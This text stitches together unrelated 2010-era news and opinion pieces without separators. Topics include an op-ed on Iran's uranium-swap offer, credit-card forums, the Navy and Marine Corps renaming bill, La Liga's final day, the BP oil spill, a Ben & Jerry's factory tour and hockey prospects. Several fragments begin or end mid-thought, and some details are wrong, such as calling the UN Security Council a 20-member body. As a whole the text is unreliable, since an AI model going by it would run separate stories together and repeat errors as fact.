Additionally , with credit not moving , and obviously not buying this move , there is nobody left who can claim the market is anything even remotely resembling orderly , efficient or fair .
SkyNet is again rising .

If Barack Obama is sincere in his policy of “ no nukes in Iran — no war with Iran , ” he will halt this rude dismissal of the offer Tehran just made to ship half its stockpile of uranium to Turkey .
Consider what President Ahmadinejad and the Ayatollah himself have just committed to do .
Iran will deliver 1,200 kilograms , well over a ton , of its 2 - ton stockpile of low - enriched uranium ( LEU ) to Turkey .
In return , Iran will receive , in a year , 120 kilograms of fuel rods for its U.S. - built reactor that produces medical isotopes for treating cancer patients .
Not only did Prime Minister Recep Tayyip Erdogan of Turkey and President Lula da Silva of Brazil put their prestige on the line by flying to Tehran , the deal they got is a near - exact replica of the deal Obama offered Iran eight months ago .
Why is President Obama slapping it away ?
Does he not want a deal ?
Has he already decided on the sanctions road that leads to war ?
Has the War Party captured the Obama presidency ?
If Iran ships the LEU to Turkey , she would be left with only enough low - enriched uranium for one test explosion .
And as that LEU is under U.N. surveillance , America would have a long lead time to act if Iran began to convert the LEU to weapons grade .
How is the Iranian program then an “ existential threat ” to anyone ?
Israel has hundreds of nuclear weapons — America thousands .
Critics say Iran still refuses to shut down the centrifuges turning out low - grade uranium .
But if Iran stops the centrifuges , she surrenders her last bargaining chip to get sanctions lifted .
Critics say Iran is trying to abort Hillary Clinton ’s campaign to have the Security Council impose a fourth round of sanctions .
Undeniably true .
But if the purpose of sanctions is to force Iran to negotiate its nuclear program , they are already working .
Tehran ’s latest offer represents real movement .
Critics say Iran will weasel out if we take up the deal .
Perhaps .
Internal opposition caused Ahmadinejad to back away from Obama ’s original offer , after he had indicated initial acceptance .
But , if so , Iran will be seen as duplicitous by Turkey and Brazil .
To the world today , the United States appears enraged that Iran is responding to America ’s own offer , that it is we who do not want a peaceful resolution , that we and the Israelis are as hell - bent on war and “ regime change ” in Iran as George W. Bush was on war and regime change in Iraq .
While the Brazilians and Turks have surely complicated Hillary ’s diplomacy , their motives are not necessarily sinister or malevolent .
Lula may be trying to one - up Obama and win a Nobel Prize as he leaves office .
But what is wrong with that ?
Bill Clinton had a Nobel in mind when , in his final days , he went all - out for a Palestinian peace .
And Erdogan leads a country that cannot wish to see Iran acquire nuclear weapons .
For Shia Iran shares a border with Sunni Turkey , and the two are rivals for influence in the Islamic world and Central Asia .
Moreover , an Iranian bomb would force Turkey to consider a Turkish bomb .
Erdogan thus has every incentive to seek a resolution of this crisis , to keep Iran free of nuclear weapons , and avert a war between yet another neighbor and his NATO ally , the United States .
If Obama refuses to take the Iranian offer seriously , it would appear a sure sign that the War Party has taken him into camp and he is departing the negotiating track for the confrontation track that leads to war .
Months ago , Time ’s Tony Karon asked the relevant question : “ What if Ahmadinejad is serious ? ”
And there are obvious reasons why he might want a deal .
First , Iran runs out of fuel this year for its reactor that produces medical isotopes .
And despite Tehran ’s braggadocio about making fuel rods itself out of its existing pile of uranium , there is no evidence Tehran is technically capable of this .
Iranians dying of cancer because Ahmadinejad failed to get those fuel rods would create enmity toward him , as well as hatred of us for denying them to Iranian cancer patients .
Second , as the U.S. intelligence community yet contends , there is no hard evidence Iran has decided to go nuclear .
For this would instantly put Iran in the nuclear gun sights of the United States and Israel .
And what benefit would Shia and Persian Iran , half of whose population is non-Persian , gain by starting a nuclear arms race in a region that is predominantly Arab and Sunni ?
Third , Ahmadinejad leads a nation that is united in insisting on all its rights under the Nonproliferation Treaty , including the right to enrich .
But his nation is deeply divided over his regime ’s legitimacy after last June ’s flawed , if not fixed , election .
If the United States were to accept Iran ’s counter - offer , it would be a diplomatic coup for Ahmadinejad .
Maybe that ’s the problem .
The powers that be do n’t really want a deal with Iran .
They want Iran smashed .

The discussions on these sites can be technical to the point of incomprehensibility .
Consider — or , rather , try to decode — this post from Credit Boards from March 2008 : “ I just could n’t resist it after reading someone ’s post that said no hard was pulled for the AMEX pre­approved application for existing card members .
I swore before that I would n’t get another card till 2009 .
So guess what ?
A HARD on EX and a toy line of $ 2,000 .
Currently at $ 20 k on HH and $ 12.5 k on Optima Plat .
This is obviously the AMEX ’s way of saying , ‘ You ’re pretty much on the borderline of the maximum credit we can extend to you .
So we gave you this card with the minimum limit .
Get ready for F / R. ’
I really regret it now . ”
HH ? F/R ?
As a general rule , a sure giveaway that online posters are living in a fantasy world is the density of abbreviations and jargon in their writing .
The credit boards have that part down .
Speaking in a sci- fi dialect , the posters fantasize not about what money can buy or even about money itself but about the badges and emblems of ample credit — the symbols that convey that , in some abstract and evidently emotional way , Citibank or Macy ’s is willing to take a chance on them .
Of course , credit lovers also sulk when a creditor wo n’t take that chance .
That ’s how you end up with punitive concepts like the “ sock drawer , ” which a poster named Richard612 defined in an idiosyncratic glossary of his on CreditNet : “ Sock drawer — Credit card purgatory .
Where you place the CC ’s ” — credit cards — “ from companies that just wo n’t play ball with you ” — meaning , presumably , the companies that wo n’t raise your credit limit or lower your interest rate .
“ The idea , ” Richard explained , “ is to have them come begging for your business again . ”
Posters on these forums often use elaborate “ sigs , ” or signatures , which serve as virtual bumper stickers announcing their creeds to the rest of the board .
One sig runs through a kind of mash - up of the slogans for some beloved creditors : “ Welcome to American Express !
What ’s in your wallet ?
Alliant , Kroger , Target , Simmons , Nordstrom , Macy ’s or Wal - Mart ?
Chase what matters , because Citi never sleeps .
Discover your world and enter Bank of America .
Like a good neighbor , PenFed is there and Nationwide is on your side .
Fico EQ 730 TU 771 EX Plus Score 742 . ( Physically and Financially Fit ) I Want Me Gold . ”
Communicating in code is one way message - board habitués put themselves at odds with ordinary offline existence .
On the credit boards , even serious debt is morally acceptable , while credit - reporting agencies are vilified and “ BK7 ” — Chapter 7 bankruptcy — is deemed “ the Mark of the Beast . ”
At the same time , posters praise shady tricks like the “ Citi Backdoor Double , ” a complex and bygone ruse for raising your credit limit .
A new report has found that nearly 70 percent of U.S. SMBs use social media , including Facebook , MySpace , blogs , YouTube and Twitter .
Research firm Access Markets International ( AMI ) Partners published the report on how U.S. small to medium - size businesses are using social media and what their usage tells us about how IT marketers should use social media to target SMBs .
Although the number of SMBs using social media has grown drastically over the last few years , the report concluded that the industry 's understanding of what drives SMBs to use these tools remains limited .
In addition , the understanding of how SMBs should be reached through social media is even less known .
Although it has doubled in growth since 2007 , social media usage among SMBs remains very narrow in scope .
Only 30 percent of small businesses perceive social media as strategically important to their continued business success , in contrast to the 61 percent of midsize businesses that do so .
" The use of social media still proves to be a difficult concept for SMBs to align their business with , in terms of administering the full breadth and depth of the online tools and maximizing their return on marketing investment [ ROMI ] , " said Jacqueline Atkinson , social media manager of AMI - Partners .
Atkinson noted AMI will be launching a series of marketing and go - to - market related studies called AMI 's SMB Marketing Optimization Series .
This series will include two multiclient studies focusing on social media , best practices to market to SMBs , and assessing SMBs ' marketing spend .
" It 's crucial to understand the - Rules of Engagement ' when using social media in the SMB space , " said Chad Thompson , vice president of AMI 's marketing strategy group .
" Although the medium in many cases is new , characteristics of the SMB market have n't changed .
Effective use of social media to drive ICT purchases in the SMB space is more science than art ; this is what this report helps explain . "
The report follows a study AMI released in April , which showed home - based businesses ( HBBs ) increasingly turning to the Web to boost business .
AMI 's study revealed that over half of HBBs in the United States use social networking sites , product - focused forum sites and blogs .
A significant number of those who are using these types of media utilize them for building customer relations and promoting their business .
The study found HBBs are also increasingly aware that Websites are a powerful tool to expand both market share and revenue opportunities - hence , the number of U.S. HBBs that have a Website grew significantly in 2009 .

Sen . John McCain John Sidney McCainBudowsky : Senate 's Trump Republicans on trial , in trouble America 's presence in Cam Ranh Bay should be more than occasional Meghan McCain , husband welcome first baby girl , Liberty Sage McCain Domenech MORE ( R - Ariz . ) is playing a major role in blocking a House bill that has a record number of co-sponsors .
The legislation , sponsored by Rep. Walter Jones ( R - N.C. ) , is one of the more straightforward bills in Congress .
It would add three words to the Navy Department ’s name , changing it from the Department of the Navy to the Department of the Navy and Marine Corps .
ADVERTISEMENT
For the first time , and with Armed Services Committee Chairman Ike Skelton ’s ( D - Mo. ) blessing , the measure will be voted on on the House floor Tuesday as a standalone bill .
The provisions in Jones ’s legislation previously passed the lower chamber as part of the annual defense authorization bill , but were repeatedly rejected in conference by senators , including McCain .
The Marine Corps is under the umbrella of the Navy Department , a fact that proponents of the Jones bill say some people do n’t know — including members of Congress .
Jones contends that not including the Marine Corps in the Navy Department ’s formal name is a slight to the Marines who have fought and died for the U.S .
McCain , the ranking Republican on the Armed Services Committee who served as a Navy captain , disagrees .
Asked if he backs the Jones measure , McCain , a graduate of the U.S. Naval Academy , responded , “ No . I do n’t .
That ’s the Department of the Navy . ”
Citing the Arizonan ’s stance on Iraq , Jones was one of the few congressional Republicans who declined to endorse McCain for president in 2008 .
The North Carolina legislator has been a strong critic of the Iraq war and the subsequent surge of U.S. troops .
In an interview , Jones acknowledged that his stance on the war and decision to withhold a presidential endorsement probably have n’t sat well with McCain , but added , “ This is n’t about Walter Jones .
This is n’t about John McCain .
This is about the Marines who serve this country .
Have n’t they earned the right to be recognized ? ”
Jones has collected 415 co-sponsors on his bill , ranging from Tea Party favorite Rep. Michele Bachmann Michele Marie BachmannEvangelicals should n't be defending Trump in tiff over editorial Mellman :
The ' lane theory ' is the wrong lane to be in White House backs Stephen Miller amid white nationalist allegations MORE ( R - Minn . ) to Rep. Lynn Woolsey ( D - Calif. ) , co-chairwoman of the Congressional Progressive Caucus .
It has the most co-sponsors of any House bill in 37 years , according to the Congressional Research Service , which informed Jones ’s office that such records are electronically unavailable prior to 1973 .
While many in Congress concentrate on big - ticket items like healthcare or immigration as their top priorities , Jones for more than 10 years has had a laser - like focus on adding those three words to the Department of the Navy ’s name .
Jones said he personally approached 99 percent of the lawmakers who have endorsed his measure , mostly during House votes .
The 67 - year - old lawmaker , whose district encompasses Marine Corps Base Camp Lejeune , said he was first alerted to the issue by Maj. Gen. R.G. Richard in 1999 .
Two years later , Jones introduced the bill .
At the end of each Congress since then , the legislation has died , usually in the upper chamber .
For years , former Senate Armed Services Committee Chairman John Warner ( R - Va. ) , who served as the secretary of the Navy , strongly opposed the Jones language .
The bill ’s prospects improved when Warner retired last cycle , but Jones still faces a significant obstacle in McCain .
Rep. Gene Taylor ( D - Miss. ) , a defense authorizer and co-sponsor of the bill , said , “ I already told Walter that I would help him in any way that I can … Sen.
McCain , let ’s face it — he is a very influential senator . ”
McCain ’s primary opponent , former Rep. J.D. Hayworth ( R - Ariz . ) , supports Jones ’s bill , according to a Hayworth spokesman .

But the Arizona senator is not the only impediment .
Sen. Jim Webb ( D - Va. ) , an Armed Services Committee member , said , “ Personally , if it ai n’t broke , do n’t fix it .
I was very proud to have served in the Marine Corps and very proud to have been secretary of the Navy … I did not have any problem being a Marine serving in the Department of the Navy . ”
Like the Obama administration , Senate Armed Services Committee Chairman Carl Levin Carl Milton LevinMichigan to pay 0 M to victims of Flint water crisis Unintended consequences of killing the filibuster Inspector general independence must be a bipartisan priority in 2020 MORE ( D - Mich . ) has not taken a position publicly on the legislation .
Levin indicated that it ’s not one of his top priorities , saying , “ I do n’t know that we will have time to look at that issue again . ”

Roberts ’s office declined repeated requests for comment .
Jones recently convinced a celebrity to make the case to Congress .
R. Lee Ermey , a retired Marine Corps drill instructor and actor who is best known for his role in the feature film “ Full Metal Jacket , ” has called on lawmakers to pass the Jones measure .
Ermey told The Hill , “ I ca n’t understand Sen. McCain ’s thoughts on this . ”
The self - described independent added that the name change would give the Marine Corps “ their fair shake , ” calling it “ ridiculous ” that Congress has n’t yet passed such a simple bill .
Other backers of the name change include Oliver North and the Veterans of Foreign Wars .
Proponents of the legislation note that the cost of it would be minimal , saying it would allow the Navy Department to use its old stationery until it ran out .
The Congressional Budget Office estimates the price tag as “ less than $ 500,000 a year over the next several years . ”
“ It ’s not a budget issue , ” Jones said .
“ It ’s a matter of respect . ”
Michael Blum , the executive director of the Marine Corps League , which represents active and retired Marines , expressed optimism that the bill will make it through the Senate this year .
“ Sens. McCain and Webb are only two people and they have their own personal reasons for why they would not be in favor of it , ” Blum said .
Javier Clemente squeezed into blue tights , pulled red knickers over the top and slapped a big yellow S on his chest .
A quick fiddle with Photoshop and the amazing transformation was complete .
Real Valladolid 's manager had , in his own words , gone into the phonebox Scum and come out a Saint ; he had , in Athletic Bilbao manager Joaquín Caparrós 's words , gone from whore to nun in five minutes .
The man they loved to hate became the man they had to love , glossing over years of insult and insinuation to stagger up to him and slur : " You 're me best mate , you are . "
They were desperate and the clock was ticking ; he was their only hope .
As La Liga entered its decisive final day , the bastard Basque became the Caped Crusader , Superman striding across the cover of Marca – the man who was going to save the day .
" We believe in you , Javi ! " cheered AS , " you can do it ! "
Not rescue Real Valladolid from relegation – let 's face it , they could n't give a monkey 's about that – but rescue Real Madrid from another season finishing empty handed .
For the first time since 1983 , three relegation places and the league title were undecided on the final day .
So too was the final Champions League slot and the two Europa League places .
After all that , it had come down to this ; it promised to be the most heart - stopping , nerve - racking , dramatic final day ever .
There were 3,486,784,401 possible combinations but , with a solitary point separating them , one , which was actually two , mattered more than any other : Madrid winning against Málaga and Barça not winning against Valladolid at the Camp Nou .
Valladolid were going to do for Madrid what Madrid could n't do for themselves : take points off Barça .
Take the league off them .
They were going to park the bus at the Camp Nou and send the title to the Bernabéu .
There was just one flaw in the plan : it was rubbish .
And so , mostly , was the final day .
Barcelona , on the other hand , were n't .
Clemente could n't save Madrid .
He could n't save Valladolid .
And Madrid could n't even save themselves .
As for parking the bus , he 'd parked a Sinclair C5 .
With a broken wheel .
If he'd become a nun in five minutes , he went back again almost as quickly .
Resistance was futile and there was no drama .
Barcelona might not have actually ended the night with the trophy in their hands – after all , that would involve the league being organised – but they did end it with fireworks and a rumble down the Ramblas , ' fans ' breaking and burning things for a laugh .
They ended the night with every player – except Zlatan Ibrahimovic , who muttered " fuck off Piqué " in English – taking the mic to declare " Visca Barça , Visca Catalunya " .
And , in truth , they were always going to .
A nervous start gave way to a stuffing , Barcelona wrapping up the league much as they have played it .
By 7.04 pm , Manucho – the striker who promised 40 goals and scored four – had missed a sitter .
And that was pretty much that ; Valladolid 's miracle had gone and taken Madrid 's hope with it .
By 7.05 pm , Madrid were a goal down in Málaga .
By 7.26 pm Luis Prieto's own goal had given Barcelona the lead .
And by 7.31 pm it was 2 - 0 .
By 8.45 pm , they had won 4 - 0 , Leo Messi getting two goals to take his league total to 34 , 47 in all competitions – equalling the club record set by Original Ronaldo in 1996 - 97 .
Madrid had got an equaliser 43 minutes earlier but it did n't matter ; all too aware of the score in Barcelona , they had virtually given up .
Forget drama , for the entire night Barça were champions .
Which felt just , somehow .
Before he'd even taken any questions in his post - match press conference , Pep Guardiola insisted : " I would like to congratulate Real Madrid , a club I admire .
They have been fantastic opponents and without them we would never have reached 99 points . "
But while Madrid had pushed Barcelona all the way to the final day , while they have kept the campaign going , there has also been something a little doomed , maybe even artificial , about their pursuit and ultimately there could be no complaints – even for those who complained , still pathetically clingingly to conspiracies .
In fact , as Madrid 's players boarded their plane last night the disappointment was tinged with a feeling of relief that it was at last all over .
" I always thought the miracle was extremely unlikely , " Sergio Ramos admitted .
Barcelona 's campaign has been virtually impeccable .
In the league at least – as Guardiola took the mic last night , he told the fans : " We should be somewhere else [ the Champions League final ] on Saturday and we 're not .
We owe you one . "
Four defeats all season have left them with just one trophy ; 23 defeats could see Atlético win two .
It would have been faintly ridiculous if they had n't even won one .
After all , in the league Barcelona have beaten Madrid twice , lost just once and racked up a record 99 points ; they have the winner of the Zamora and Pichichi awards , and finished with a goal difference of +74 .
Expected to drop points against Villarreal and Sevilla as the pressure built , they scored seven times .
When they dropped points against Espanyol it was taken as a defeat but insisted that was the point that allowed them to win the league .
They have not even had to come back from behind for a single one of their 31 victories and have been top or joint top for all bar six weeks of the season .
The final day elsewhere …
But if the way the final day unfolded felt just , it also felt a bit , well , flat .
It felt like so much of this season has felt ; every week , D - day was postponed but when D - day came at the top and the bottom , it just was n't that dramatic .
In fact , it ended up being a squib so damp you wondered if it had spent the last month stuffed into the deepest recesses of an otter 's pocket .
The closeness , the pressure and the tension was a red herring ; the chance was always there but reality was different .
On the final day of the season , only one game was irrelevant – step forward Deportivo de La Coruña – and every significant place except third , taken by Valencia , was still open .
But if everyone expected La Liga to spend week 38 frantically chopping and changing like Henry VIII , it did n't happen .
Of the seven key places up for grabs on the final day , six ended up being occupied by the same teams that occupied them at the start of the day : Barcelona at the top , Sevilla in the Champions League , Getafe and Mallorca in the Europa League , and Xérez and Tenerife in the second division .
The same teams that occupied them virtually all day .
The same teams that have occupied them virtually all year , in fact .
Getafe 's Europa League place was safe from the start ; Xérez 's relegation was a done deal .
It all was .
Relegation ...
At the bottom , five teams were within three points of each other , four of them level on 36 points .
But still virtually nothing moved .
According to the LFP , at the start of the final day , Xerez , Tenerife and Málaga were down ( although the Spanish Football Federation 's website disagreed , showing Valladolid in the relegation zone instead of Málaga ) ; at 7.08 pm it was Racing , Tenerife and Xérez and by 7.26 pm , it was Valladolid , Tenerife and Xérez and that was that .
There was still an hour and 20 minutes left but nothing changed .
And while it is easy to say with hindsight , the three who fell always seemed likely to fall .
Although it was last week , Valladolid had been out of the relegation zone only once – and that was on goal difference – in 17 weeks ;
Tenerife have been in the relegation zone for the whole of the second half of the season and Xérez have been in the relegation zone since week two and bottom for 26 weeks .
In the end , Racing Santander and Málaga survived .
Survival came with 37 points – the lowest it has ever been under three points for a win .
It also came to at least one side that everyone expected to survive .
Racing were facing nothing - to - play - for Sporting Gijón , the leader of the Cantabrian government Miguel - Ángel Revilla had appealed for Sporting 's fans to support his side and not their own in an act of Cantabrian - Asturian brotherhood , and mostly they had said " OK then " .
Not least because they had n't forgotten Valladolid 's fans chanting about how they were going to get relegated last year .
Racing were two up within 10 minutes of the second half starting and never in the relegation zone .
Right down the other end of Spain , Málaga did escape the relegation zone , prompting a proper pitch invasion , and leaving tearful president Fernando Sanz crying on the shoulder of Florentino Pérez – once his sworn enemy – and declaring that he would fine any players not found out on the town at five in the morning .
And yet even they had been in the relegation zone just once in 20 weeks .
And had been out of it from the fourth minute .
... And the Champions League and Europa League places ...
Luckily , there was drama in Palma .
Not for the first time – as any one who remembers that Rivaldo goal can testify – the most ridiculous climax happened to the teams chasing the Champions League places .
When the final whistle went on Mallorca 's match against Espanyol on Saturday night , Real Mallorca were fourth and in the Champions League having just won 2 - 0 and with Sevilla drawing 2 - 2 in Almería .
Sevilla were a man down having had Alvaro Negredo sent off for the third time this season but rather than send on Luis Fabiano , the Brazilian striker who had scored 15 league goals in just 18 starts , coach Antonio Álvarez sent on a 19 - year - old kid called Rodri who had played just four minutes .
Four minutes had been added on , but the game was already well into the 93rd ; the season was drawing to a close .
It was nearly midnight and up in the presidential box , Sevilla 's sporting director Monchi was silently , desperately saying a prayer .
Sevilla , in short , were doomed .
Mallorca 's players and staff gathered in the centre circle at the Son Moix , giant bottles of champagne at their feet , ready to be popped , and together with their fans watched the final 45 seconds on the scoreboard high in the stands , hastily switched to TV channel La Sexta .
Even the club 's cuddly devil mascot Dimoni – the real star of their campaign this season – was there with his squidgy pitchfork , forked tail and cheesy grin , sitting , oversized hands covering his great big googly foam eyes , heart in his gaping mouth , all ready to start celebrating in style .
And then , through the pixels , it happened .
Jesús Navas 's cross was knocked down and bounced up .
High .
Ten yards out .
Rodri leapt vertically , flipped himself sideways and somehow volleyed it in ; 3 - 2 , 93rd minute , fourth place !
Crisis averted .
A 19 - year - old whom no one had ever heard of had just sent Sevilla into the Champions League with 45 seconds left .
And sent Mallorca out .
Cameras caught Monchi launching himself across the directors ' box and into the arms of a colleague , practically humping him in delight .
Back at the Son Moix , Mallorca 's players slumped , like Striker 's co-pilot with the valve removed .
They just lay flat , motionless against the turf , tears in their eyes , unpopped bottles at their side .
They say there 's nothing worse than seeing a grown man cry but there is .
Seeing a grown man in an acrylic devil costume cry .
Seeing 35 grown men cry .
In front of 20,000 fans .
And live on television .

ANKARA ( PanArmenian.net ) — Turkey is set to take over the rotating presidency of the United Nations Security Council in June 2010 , the country ’s permanent representative to the UN , Baki Ilkin , said Thursday .
According to the Journal of Turkish Weekly , Ilkin will preside over all low - level Security Council meetings while Turkish Foreign Minister Ahmet Davutoglu will chair high - level sessions .
Turkey became a non-permanent member of the 20 - member Security Council in 2009 and its term expires this year .
The Security Council President is responsible for setting the agenda of meetings , presiding over meetings and overseeing any crisis .
The President is also authorized to issue both presidential statements and notes , which are used to make declarations of intent that the full Security Council can then pursue .
The Presidency rotates monthly in alphabetical order of the Security Council member nations ’ names in English .
Gov. Arnold Schwarzenegger on Monday withdrew his support for a plan he championed to allow new offshore oil drilling off Santa Barbara County , citing the disastrous oil spill in the Gulf of Mexico .
Schwarzenegger , whose administration as recently as Friday defended the proposed Tranquillon Ridge offshore drilling project , said images of the spill in the gulf changed his mind .
" All of you have seen , when you turn on the television , the devastation in the gulf , and I 'm sure that they also were assured that it was safe to drill , " he said at a news conference Monday .
" I see on TV the birds drenched in oil , the fishermen out of work , the massive oil spill and oil slick destroying our precious ecosystem .
That will not happen here in California , and this is why I am withdrawing my support for the T - Ridge project . "
His new stance all but guarantees the demise of the proposal by a Texas oil company to allow the first new drilling in state waters in 40 years .
The governor had previously argued that the state , which is facing a $ 20 billion budget shortfall , should approve the plan to raise as much as $ 100 million a year in new revenue .
The plan would allow Plains Exploration & Production Co. of Houston to use an existing oil platform in federal waters to drill just over the line in state waters .
The plan included an agreement by Plains to shut down all operations in the area after 14 years .
" My support for the T - Ridge project in California was based on numerous studies making me feel it was safe to drill ... and a commitment to remove the platforms , " Schwarzenegger said at a signing ceremony for executive orders on wildlife prevention .
Easy decision
The Republican governor , who has made environmental issues one of the cornerstones of his administration , said the trade - off between new revenues and the potential for environmental devastation made the decision easy .
" If I have a choice between $ 100 million and what you are seeing in the Gulf of Mexico , I 'd rather just find out a way to make up for that $ 100 million , " he said .
When " you turn on television and see the enormous disaster , you say to yourself , ' Why would we want to take that risk ? '
The risk is just much greater than the money is worth , and so we will figure out how to deal with the extra $ 100 million problem . "
Opponents of the proposal , including Assemblyman Pedro Nava , D - Santa Barbara , cheered the decision .
" I 'm just glad that he joined me and most of the rest of California in opposing the oil drilling , " said Nava , who is running for state attorney general .
" This is good news for all of California . "
Proposal rejected
Last year , the three - member State Lands Commission that has governed oil - leasing decisions since 1938 rejected the proposal by Plains Exploration .
But as the state grappled with a huge cash shortfall and deficit , the governor attempted to do an end - run around that body and went to the Legislature to approve the project .
The Assembly rejected the plan , which would have raised up to $ 4 billion for the state during the 14 - year period , depending on oil prices .
Since then , however , Abel Maldonado , R - Santa Maria ( Santa Barbara County ) , replaced the Democratic lieutenant governor , who held the swing seat on the State Lands Commission .
Environmentalists and other opponents of the project worried that if the oil company resubmitted its plan to the commission , as it was expected to do , Maldonado might allow the plan to move forward .
Maldonado has refused to take a position , saying he needs to review the proposal but that , in general , he wants to see the platforms come down .
A spokesman for Plains Exploration & Production Co. could not be reached for comment .
State Controller John Chiang , who sits on the State Lands Commission and voted against the project last year , praised the governor 's new position .
" I am pleased the governor has withdrawn his support for what would have been the first new oil lease off the coast of California in 40 years , " he said in a prepared statement .
" As a member of the State Lands Commission who voted against the project last year , I am saddened that it took a tragic and massive oil spill in the Gulf of Mexico to remind us how important it is that we continue to protect California 's shores and our multi-billion dollar coastal and port economies . "
DALLAS --
Officials say an 87 - year - old man has died after the car he was in crashed into the wall at Texas Motor Speedway in Fort Worth during the weekend .
Troy Taylor of the Denton County Medical Examiner 's Office said Tuesday that Fred Krusemark of Dallas died of blunt force trauma to the head and neck after Saturday 's crash .
He says Krusemark died Monday .
Krusemark was taking part in a ride - along program offered by a company called Texas Driving Experience .
The owner of the company did n't immediately return a phone call from The Associated Press seeking comment , and both the Krusemark family and a spokesman for the speedway declined comment Tuesday .
Thick sheets of crude oil spread through the delicate wetlands of Louisiana today , as the BP oil spill continued to threaten the American coastline .
Local reports described heavy sheets of oil the consistency of latex paint clogging the marshes in the Mississippi delta that provide a haven for migratory birds , and buffer the shore from Gulf hurricanes .
" This is what everyone wanted to avoid , because the wetlands are the nursery for everything that swims or crawls in the Gulf of Mexico , " said John Hocevar , oceans campaigner for Greenpeace .
" Once the oil gets stuck in there we are pretty much stuck with it . "
The sightings of heavy crude over the last 24 hours were seen as a far more serious threat to nesting birds , spawning fish and endangered sea turtles than the scattered tar balls and light sheen spotted earlier on the shoreline .
" Twenty - four miles of Plaquemines parish is destroyed .
Everything in it is dead , " Billy Nungesser , head of the parish in southern Louisiana , told MSNBC after a tour of the marshes .
Anger has grown at BP and the government for failing to anticipate and contain the disaster , a month after the sinking of the Deepwater Horizon .
Louisiana 's Republican governor , Bobby Jindal , has warned for days that the thousands of miles of boom deployed by BP were too flimsy to keep back the oil during bad weather , and that the government needed to build sand barriers .
Florida could be next , with oil now caught up in the powerful Loop Current .
Alabama and Mississippi have also been affected by the spill .
In Washington , members of Congress have accused BP and the administration of covering up the scale of the disaster threatening the shoreline as well as the deep waters of the Gulf .
Ben & Jerry ’s Trip : The Ice Cream Factory
Posted May 7th , 2010 | 3:30 am by Ryan
While I may not make my living writing about food , I ’ve still managed to experience some cool perks .
Back in April I attended a blogger event hosted by the nice people from the Ben & Jerry ’s Ice Cream company .
Getting a chance to tour the factory in Waterbury , Vermont and having an inside look at the South Burlington headquarters is a food blogger ’s dream come true .
So joined up with a dozen or so other writers , I was able to visit the “ Green Mountain State ” of Vermont and enter a world of peace , love and ice cream .
The event kicked off with a tour of the Ben & Jerry ’s Ice Cream factory in Waterbury , VT .
Basically nestled among back roads and surrounded by mountains , the ice cream factory is like an oasis in the desert .
Doubling as a production plant and a popular tourist spot , the Waterbury location is like the mecca of Ben & Jerry ’s Ice Cream .
On the grounds of the property you ’ll find many indications that you are in the land of Ben & Jerry .
Humorous signs , B&J inspired painted buildings and doors and even a bus .
We ’re dealing with a company here that makes it obvious that they like to have fun .
Upon entering the building , you ’ll notice things such as a display of ice cream scoops that date back to the 1800’s .
Lessons in the company ’s history can be found at almost every turn as you enter into the lobby area … which features a gift shop .
After gazing upon the walls of memorabilia and history lessons , we start our tour .
I got almost a fun house - type atmosphere from the first step into the tour .
Immediately greeted by steps leading upstairs , walls are painted with cows and ice cream .
A recording of cows mooing can be heard and I start to wonder if this is what a Chick - fil - A tour might be like .
One of our first stops is into a small movie theater to watch a short documentary on the history of the company .
In a nutshell , friends Ben Cohen and Jerry Greenfield had ideas involving bagels and other ideas involving ice cream .
They obviously made the right move with ice cream .
They took a $ 5 course on ice cream making at Penn State in 1977 and opened an ice cream parlor in Burlington , Vermont in 1978 .
The first Ben & Jerry ’s shop was actually a remodeled and renovated gas station .
So the idea was to bring quality ice cream to customers and at the same time , take on social mission with the community and eventually the world ( we ’ll get to that in a later post ) .
So … after the moooo - vie ( yeah the tour guide John made us say it like that ) … we enter a hallway with walls covered with signs that said “ Do n’t Peak ” .
Moments later a button is pressed somewhere and the walls open up to windows showing factory workers down on the line .
Pints of ice cream travelling on conveyor belts and all sorts of “ ice cream machinery ” .
Station after station of the ice cream making process taking place before our eyes .
I could n’t quite grasp what I was really looking at , all I knew was there were a bunch of workers making magic .
We are given details on the process , but I ’m too busy staring at giant barrels of ice cream ingredients to take it all in .
After being thoroughly teased with the Ben & Jerry ’s world , we are then led down some more stairs and enter the FlavoRoom .
Here we were able to get some delicious samples of one of the latest additions at Ben & Jerry ’s , Milk & Cookies .
I can see this being a favorite of many : Vanilla Ice Cream with a Chocolate Cookie Swirl , Chocolate Chip & Chocolate Chip Cookies .
Following the FlavoRoom we are taken into yet another room where there are no more teases .
Pint after pint of the latest flavors come out for our waiting spoons .
The six new flavors for 2010 are Boston Cream Pie , Dulce Delish , Maple Blondie , Milk & Cookies , Mud Pie and Peanut Brittle .
Boston Cream Pie : Boston Cream
Pie ice cream with Yellow Cake Pieces , Fudge Flakes and Swirls of Pastry Cream

: Chocolate & Coffee Liqueur Ice Creams Swirled Together with a Chocolate Cookie Swirl Peanut Brittle : Peanut Brittle Ice Cream with Peanut Brittle Pieces & a Caramel Swirl
I ’d have to say my two favorites of the new 2010 flavors are Maple Blondie and Milk & Cookies .
Of the current batch of flavors , my current # 1 would have to be Stephen Colbert ’s AmeriCone Dream … Vanilla Ice Cream with Fudge Covered Waffle Cone Pieces & a Caramel Swirl …it ’s amazing .
While downing ice cream , we are visited by members of the Quality Assurance team .
We are given a demonstration of this pint - splitting machine .
It ’s literally a machine that splits a pint of ice cream and then can be analyzed for any possible issues .
This ice cream auditing process seems like one of the best jobs in the building .
We all get a chance to sample what ice cream fresh “ off the line ” is like .
This stuff is great .
Having a chance to taste ice cream that was made within hours is a real treat .
After the pints and pints of ice cream , our tour experience came to a close with a trip to the Ben & Jerry ’s Flavor Graveyard .
With the Abbotsford Heat playing in the second round of the Calder Cup playoffs , many Flames fans are paying close attention to their results and what it means for the development of some of the team 's prospects .
These prospects range from AHL vets like Kris Chucko , Cam Cunning , and David Van der Gulik who have nearly fallen off the organization 's depth chart , to Mikael Backlund and on - the - cusp defenceman Matt Pelech , to the likes of Lance Bouma , Mitch Wahl , Bryan Cameron , and T.J. Brodie -- all making their pro debuts fresh out of junior .
Despite the recent improvement in the Flames ' prospect stable , the question remains -- how many of these players could adequately fill a roster spot with the big club when needed ?
Jonathan Willis had this to say in his piece on the topic of depth at the AHL level yesterday :
" ... NHL organizations need to be sure they have at least one NHL - calibre forward and one NHL - calibre defenceman at the AHL level to start the season , and that there should be at least six other players that they ’d be okay with playing at least limited minutes at the NHL level .
It goes without saying that for teams with more significant injury problems , even more players might be expected to play minutes in the NHL .
At a minimum , I think an NHL manager would be well advised to have two NHL - calibre forwards in the AHL , and one NHL - calibre defenceman in the AHL , as well as being sure that his 13th and 14th forwards and his seventh defenceman are capable of playing regular minutes , because they ’ll be required to at some point over the course of the season .
